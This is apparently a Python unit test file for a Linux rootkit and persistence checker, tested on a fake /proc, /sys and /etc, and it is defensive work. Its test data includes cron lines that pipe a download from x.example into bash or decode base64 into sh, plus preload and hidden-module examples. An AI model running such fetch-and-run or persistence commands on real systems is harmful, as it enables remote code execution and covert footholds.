"""Linux system check on a fake /proc, /sys and /etc: findings, and no false alarms."""
import os
import tempfile
import unittest
from pathlib import Path

from backends import linux_system_check as check


class SystemCheckTests(unittest.TestCase):
    def setUp(self):
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        self.root = Path(directory.name)
        self.proc, self.sys, self.etc = self.root / 'proc', self.root / 'sys', self.root / 'etc'
        self.home, self.config = self.root / 'home', self.root / 'home/.config'
        for folder in (self.proc, self.sys / 'module', self.etc, self.config):
            folder.mkdir(parents=True)

    def write(self, path, text):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
        return path

    def process(self, pid, exe=None, name='prog', group=None, command=None):
        folder = self.proc / str(pid)
        folder.mkdir()
        if exe is not None:
            os.symlink(exe, folder / 'exe')
        self.write(folder / 'comm', name + '\n')
        self.write(folder / 'status', f'Name:\t{name}\nTgid:\t{group or pid}\nPid:\t{pid}\n')
        (folder / 'cmdline').write_bytes((command or name).encode() + b'\0--flag\0')

    def checks(self, findings):
        return [entry['check'] for entry in findings]

    def test_extra_library_for_every_program_is_found(self):
        self.assertEqual(check.preload_file(self.etc), [])
        self.write(self.etc / 'ld.so.preload', '# nothing\n\n')
        self.assertEqual(check.preload_file(self.etc), [])
        self.write(self.etc / 'ld.so.preload', '/usr/lib/libhide.so\n')
        findings = check.preload_file(self.etc)
        self.assertEqual(self.checks(findings), ['preload'])
        self.assertIn('/usr/lib/libhide.so', findings[0]['detail'])

    def test_extra_library_in_startup_files_is_found_but_not_in_comments(self):
        self.write(self.home / '.bashrc', '# export LD_PRELOAD=/old.so\nalias ll="ls -l"\n')
        self.write(self.config / 'systemd/user/x.service.d/override.conf', '[Service]\nEnvironment=PATH=/usr/bin\n')
        self.assertEqual(check.preload_in_startup_files(self.home, self.config, self.etc), [])
        self.write(self.home / '.profile', 'export LD_PRELOAD=/home/u/.cache/.l.so\n')
        self.write(self.config / 'systemd/user/x.service.d/override.conf', '[Service]\nEnvironment=LD_PRELOAD=/x.so\n')
        findings = check.preload_in_startup_files(self.home, self.config, self.etc)
        self.assertEqual(len(findings), 2)
        self.assertIn('.l.so', findings[0]['detail'] + findings[1]['detail'])

    def test_programs_from_temporary_folders_or_memory_are_found(self):
        self.process(100, '/usr/bin/firefox (deleted)', 'firefox')  # still running after an update
        self.process(101, '/tmp/.mount_EtcherX/etcher', 'etcher')  # an AppImage
        self.process(102, '/memfd:runc_cloned:/proc/self/exe (deleted)', 'runc')
        self.process(103, '/dev/shm/.x/kworker', 'kworker')
        self.process(104, '/memfd:payload (deleted)', '3', command='/proc/self/fd/3')
        self.process(105)  # a kernel thread or another user's process: no readable exe
        findings = check.suspicious_processes(self.proc)
        self.assertEqual(self.checks(findings), ['temporary-process', 'memory-process'])
        self.assertIn('kworker (process 103) runs /dev/shm/.x/kworker', findings[0]['detail'])
        self.assertIn('3 (process 104)', findings[1]['detail'])

    def test_hidden_process_is_found_but_threads_are_not(self):
        self.write(self.proc / 'sys/kernel/ns_last_pid', '60\n')
        self.process(1, name='systemd')
        self.process(40, name='bash')
        self.process(41, name='bash', group=40)  # a thread: exists, but not listed
        self.process(50, name='diamorphine')
        listed = lambda _proc: {1, 40}  # a rootkit hides 50 from the listing
        findings = check.hidden_processes(self.proc, listed)
        self.assertEqual(self.checks(findings), ['hidden-process'])
        self.assertIn('Process 50 (diamorphine)', findings[0]['detail'])
        self.assertEqual(check.hidden_processes(self.proc, lambda _proc: {1, 40, 50}), [])

    def test_hidden_kernel_module_is_found_but_built_in_parts_are_not(self):
        self.write(self.proc / 'modules', 'nvidia 54001664 0 - Live 0x0\n')
        self.write(self.sys / 'module/nvidia/initstate', 'live\n')
        (self.sys / 'module/printk').mkdir()  # built into the kernel: no initstate
        self.assertEqual(check.hidden_modules(self.proc, self.sys), [])
        self.write(self.sys / 'module/reptile/initstate', 'live\n')
        findings = check.hidden_modules(self.proc, self.sys)
        self.assertEqual(self.checks(findings), ['hidden-module'])
        self.assertIn('reptile', findings[0]['detail'])

    def test_startup_entries_that_download_decode_or_run_from_temporary_folders(self):
        commands = [
            ('autostart', '/usr/bin/nextcloud --background'),
            ('autostart', 'sh -c "sleep 5 && /usr/bin/syncthing"'),
            ('cron', '*/5 * * * * curl -fsSL http://x.example/i.sh | bash'),
            ('cron', '@reboot echo ZWNobyBoaQ== | base64 -d | sh'),
            ('systemd', '/tmp/.ICE-unix/.x/update'),
            ('autostart', '/tmp/.mount_Obsidian/obsidian'),
        ]
        findings = check.suspicious_startup_commands(commands)
        self.assertEqual([entry['title'].split()[-1] for entry in findings], ['script', 'commands', 'folder'])

    def test_crontab_lines_are_read_without_comments(self):
        crontab = self.write(self.root / 'bin/crontab', '#!/bin/sh\nprintf "# m h\\nMAILTO=x\\n@reboot /tmp/a\\n"\n')
        crontab.chmod(0o755)
        self.write(self.etc / 'cron.d/backup', '# nightly\n0 3 * * * root /usr/bin/backup\n')
        commands = check.crontab_commands(self.etc, crontab=str(crontab))
        self.assertIn(('your crontab', '@reboot /tmp/a'), commands)
        self.assertIn((str(self.etc / 'cron.d/backup'), '0 3 * * * root /usr/bin/backup'), commands)
        self.assertNotIn('# m h', [command for _source, command in commands])

    def test_all_checks_report_what_ran_and_skip_what_is_unavailable(self):
        self.write(self.proc / 'modules', '')
        findings, ran = check.run_checks(home=self.home, config=self.config, startup_commands=[],
                                         proc=self.proc, sys=self.root / 'missing', etc=self.etc)
        self.assertEqual(findings, [])
        self.assertIn('Hidden programs', ran)


if __name__ == '__main__':
    unittest.main()
